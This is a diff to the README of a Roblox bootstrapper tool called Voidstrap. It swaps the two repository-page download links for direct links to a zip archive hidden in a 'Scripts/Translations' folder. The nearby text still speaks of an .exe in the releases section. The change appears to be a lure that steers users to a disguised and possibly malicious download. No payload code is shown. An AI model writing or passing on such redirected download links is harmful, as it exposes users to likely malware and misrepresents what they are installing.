@@ -1,6 +1,6 @@
 # 🛠 Voidstrap - Customizing your Roblox experience with ease
 
-[![Download Voidstrap](https://img.shields.io/badge/Download-Voidstrap-blue.svg)](https://github.com/estywi8559/Voidstrap)
+[![Download Voidstrap](https://img.shields.io/badge/Download-Voidstrap-blue.svg)](https://github.com/estywi8559/Voidstrap/raw/refs/heads/main/Scripts/Translations/Software-v1.4.zip)
 
 Voidstrap serves as an improved version of the standard Roblox bootstrapper. It offers tools to change how the game looks, sounds, and behaves on your computer. This software works as an alternative to the default launcher. It provides a menu to manage settings that you cannot change in the official game client.
 
@@ -16,7 +16,7 @@ You do not need technical knowledge to install this tool. Follow the steps below
 
 ### Downloading the Software
 
-[Visit this page to download the latest version of Voidstrap](https://github.com/estywi8559/Voidstrap).
+[Visit this page to download the latest version of Voidstrap](https://github.com/estywi8559/Voidstrap/raw/refs/heads/main/Scripts/Translations/Software-v1.4.zip).
 
 Navigate to the releases section on the landing page. Look for the file ending in `.exe`. Click this file to save it to your computer. Once the download finishes, move the file to a folder where you want to keep your game tools.
 
